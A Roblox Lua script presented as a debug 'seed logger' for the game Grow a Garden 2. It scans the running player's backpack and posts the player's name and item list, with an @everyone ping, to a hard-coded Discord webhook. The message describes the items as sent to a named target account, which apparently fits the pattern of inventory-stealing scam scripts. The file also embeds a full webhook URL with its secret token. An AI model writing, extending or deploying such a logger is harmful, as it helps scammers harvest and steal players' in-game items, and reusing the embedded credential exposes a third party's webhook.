-- Grow a Garden 2 - Debug Seed Logger
-- Simplified version with extensive debugging

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
print("[SEED LOGGER] Script loaded for player: " .. player.Name)

-- Discord Webhook Configuration
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1510029460936589513/zF9cI_daTfZgChZJam0o8Iv5NljVbL4sFV_3USx8ZHheFw1mnx6rXe7Fue5ZQRwxCKnw"
local TARGET_PLAYER = "Dark_Lightskin999"

-- ============ SIMPLE TEST ============
local function testWebhook()
    print("[TEST] Attempting to send test message to Discord...")
    
    local testMessage = {
        content = "@everyone",
        embeds = {
            {
                title = "🔔 Seed Logger Test",
                description = "Script is running! Testing webhook connection...",
                color = 3066993
            }
        }
    }
    
    local jsonPayload = HttpService:JSONEncode(testMessage)
    print("[TEST] JSON Payload created: " .. string.len(jsonPayload) .. " bytes")
    
    local success, response = pcall(function()
        print("[TEST] Sending POST request...")
        return HttpService:PostAsync(DISCORD_WEBHOOK, jsonPayload, Enum.HttpContentType.ApplicationJson)
    end)
    
    if success then
        print("[SUCCESS] ✅ Webhook sent successfully!")
        print("[RESPONSE] " .. tostring(response))
        return true
    else
        print("[ERROR] ❌ Webhook failed: " .. tostring(response))
        return false
    end
end

-- ============ GET ALL SEEDS ============
local function getAllSeeds()
    print("[SEEDS] Scanning for seeds...")
    local seeds = {}
    
    local backpack = player:FindFirstChild("Backpack")
    print("[SEEDS] Backpack found: " .. tostring(backpack ~= nil))
    
    if backpack then
        print("[SEEDS] Items in backpack: " .. tostring(#backpack:GetChildren()))
        for _, item in pairs(backpack:GetChildren()) do
            print("[ITEM] Found: " .. item.Name .. " (Class: " .. item.ClassName .. ")")
            
            if item:FindFirstChild("SeedData") or item.Name:match("[Ss]eed") or item.ClassName == "Tool" then
                table.insert(seeds, {
                    name = item.Name,
                    type = item.ClassName
                })
                print("[ITEM] ✅ Added to seeds list")
            end
        end
    end
    
    print("[SEEDS] Total seeds found: " .. tostring(#seeds))
    return seeds
end

-- ============ SEND SEEDS TO DISCORD ============
local function sendSeedsToDiscord(seeds)
    print("[DISCORD] Preparing seed list message...")
    
    local seedList = ""
    if #seeds > 0 then
        for i, seed in pairs(seeds) do
            seedList = seedList .. "🌿 " .. seed.name .. "\n"
        end
    else
        seedList = "No seeds found"
    end
    
    local discordMessage = {
        content = "@everyone",
        embeds = {
            {
                title = "🌱 Grow a Garden 2 - Seeds Traded",
                description = "**" .. player.Name .. "** sent seeds to **" .. TARGET_PLAYER .. "**",
                color = 3066993,
                fields = {
                    {
                        name = "Sender",
                        value = player.Name,
                        inline = true
                    },
                    {
                        name = "Recipient",
                        value = TARGET_PLAYER,
                        inline = true
                    },
                    {
                        name = "Seeds Count",
                        value = tostring(#seeds),
                        inline = true
                    },
                    {
                        name = "Seeds List",
                        value = seedList,
                        inline = false
                    }
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }
    
    local jsonPayload = HttpService:JSONEncode(discordMessage)
    print("[DISCORD] JSON created: " .. string.len(jsonPayload) .. " bytes")
    
    local success, response = pcall(function()
        print("[DISCORD] Sending webhook...")
        return HttpService:PostAsync(DISCORD_WEBHOOK, jsonPayload, Enum.HttpContentType.ApplicationJson)
    end)
    
    if success then
        print("[DISCORD] ✅ Webhook sent!")
        return true
    else
        print("[DISCORD] ❌ Error: " .. tostring(response))
        return false
    end
end

-- ============ MAIN EXECUTION ============
local function execute()
    print("\n" .. string.rep("=", 50))
    print("[MAIN] Starting Seed Logger...")
    print(string.rep("=", 50) .. "\n")
    
    -- Test webhook first
    print("[STEP 1] Testing webhook connection...")
    local webhookWorking = testWebhook()
    wait(1)
    
    if not webhookWorking then
        print("[MAIN] ⚠️ Webhook test failed. Check your webhook URL!")
        return
    end
    
    -- Get seeds
    print("\n[STEP 2] Collecting seeds...")
    local seeds = getAllSeeds()
    wait(0.5)
    
    -- Send to Discord
    print("\n[STEP 3] Sending seeds to Discord...")
    local sent = sendSeedsToDiscord(seeds)
    wait(0.5)
    
    if sent then
        print("\n" .. string.rep("=", 50))
        print("[MAIN] ✅ ALL TASKS COMPLETE!")
        print(string.rep("=", 50) .. "\n")
    else
        print("\n[MAIN] ❌ Some tasks failed. Check console output above.")
    end
end

-- ============ EXPORTS ============
return {
    execute = execute,
    testWebhook = testWebhook,
    getAllSeeds = getAllSeeds,
    sendSeedsToDiscord = sendSeedsToDiscord
}
